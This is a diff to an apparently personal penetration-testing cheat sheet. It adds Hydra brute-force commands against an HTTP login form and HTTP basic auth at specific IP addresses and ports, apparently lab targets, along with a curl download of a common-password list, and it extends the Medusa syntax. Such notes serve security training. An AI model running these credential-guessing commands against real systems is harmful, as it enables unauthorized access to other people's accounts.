@@ -11,11 +11,18 @@ hydra [-l login] | -L file] [-p PASS | -P file] [-C file] [-s port] -m MODULE [s
 hydra -l admin -P /path/to/password_list.txt ftp://192.168.1.100
 hydra -l root -P /path/to/password_list.txt ssh://192.168.1.100
 hydra -l admin -P /path/to/password_list.txt 127.0.0.1 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
+hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt 94.237.123.185 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials" -s 51334
+```
+
+**Basic Auth
+```
+curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/56a39ab9a70a89b56d66dad8bdffb887fba1260e/Passwords/2023-200_most_used_passwords.txt
+hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 94.237.49.88 http-get / -s 36458
 ```
 
 ## Medusa
 ```
-medusa [-h host|-H file] [-u username|-U file] [-p password|-P file] [-C file] -M module [OPT]
+medusa [-h host|-H file] [-u username|-U file] [-p password|-P file] [-C file] [-n port] -M module [OPT]
 medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh
 medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M ftp -t 5
 medusa -h 192.168.1.100 -u admin -P passwords.txt -M rdp
